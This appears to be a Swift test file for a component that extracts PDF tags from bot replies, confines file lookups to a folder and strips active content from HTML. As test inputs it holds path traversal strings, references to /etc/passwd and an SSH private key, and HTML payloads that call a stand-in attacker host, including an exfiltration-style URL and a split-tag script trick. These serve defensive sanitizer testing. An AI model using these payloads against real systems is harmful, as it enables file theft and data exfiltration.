import Foundation
import Testing
@testable import ClickyCore

struct BotPDFOrderTests {
    @Test func takesTheTagOutAndKeepsTheWords() {
        let taken = BotPDFOrder.extract(from: "Here's the invoice.\n[PDF: invoice.md]\nAnything else?")
        #expect(taken.files == ["invoice.md"])
        #expect(taken.text == "Here's the invoice.\n\nAnything else?")
    }

    @Test func aTagInCodeIsLeftAlone() {
        let taken = BotPDFOrder.extract(from: "Write `[PDF: x.md]` to get one.")
        #expect(taken.files.isEmpty)
    }

    @Test func onlyFilesInsideTheFolder() throws {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("pdf-order-\(UUID().uuidString)/ledger", isDirectory: true)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder.deletingLastPathComponent()) }
        #expect(BotPDFOrder.file(named: "invoice.md", in: folder)?.lastPathComponent == "invoice.md")
        #expect(BotPDFOrder.file(named: "sub/invoice.md", in: folder)?.lastPathComponent == "invoice.md")
        #expect(BotPDFOrder.file(named: "../bots.json", in: folder) == nil)
        #expect(BotPDFOrder.file(named: "sub/../../bots.json", in: folder) == nil)
        #expect(BotPDFOrder.file(named: "/etc/passwd", in: folder) == nil)
        #expect(BotPDFOrder.file(named: folder.appendingPathComponent("ok.md").path, in: folder) != nil)
    }

    @Test func atMostThreePerReply() {
        let text = (1...5).map { "[PDF: f\($0).md]" }.joined(separator: "\n")
        #expect(BotPDFOrder.extract(from: text).files.count == 3)
    }

    @Test func htmlCantMakeTheRendererFetchAnything() {
        let html = """
        <html><head><link rel="stylesheet" href="https://evil.example/x.css"><meta http-equiv="refresh" content="0;url=https://evil.example">
        <style>@import url("https://evil.example/a.css"); body { background: url(file:///Users/me/.ssh/id_rsa); color: #333 }</style></head>
        <body background="https://evil.example/bg.png"><h1>Invoice</h1>
        <img src="file:///Users/me/Pictures/private.jpg"><IMG SRC=https://evil.example/?d=secret />
        <iframe src="file:///etc/passwd">x</iframe><object data="https://evil.example/o"></object>
        <script>fetch('https://evil.example')</script><scr<img>ipt src="https://evil.example/s.js"></script>
        <svg><image xlink:href="https://evil.example/i.png"/></svg>
        <table><tr><td>Total</td><td>$360</td></tr></table>
        <a href="https://example.com/pay">Pay here</a></body></html>
        """
        let inert = BotPDFOrder.inertHTML(html).lowercased()
        #expect(!inert.contains("evil.example/x.css"))
        #expect(!inert.contains("<img"))
        #expect(!inert.contains("<iframe"))
        #expect(!inert.contains("<object"))
        #expect(!inert.contains("<script"))
        #expect(!inert.contains("<svg"))
        #expect(!inert.contains("<link"))
        #expect(!inert.contains("<meta"))
        #expect(!inert.contains("@import"))
        #expect(!inert.contains("url("))
        #expect(!inert.contains("src="))
        #expect(!inert.contains("background=\""))
        // The only file path left is inside CSS that no longer loads anything.
        #expect(inert.components(separatedBy: "file:///").count == 2)
        #expect(inert.contains("blocked(file:///"))
        // The document itself is still there.
        #expect(inert.contains("<h1>invoice</h1>"))
        #expect(inert.contains("<td>$360</td>"))
        #expect(inert.contains("<a href=\"https://example.com/pay\">pay here</a>"))
        #expect(inert.contains("color: #333"))
    }
}
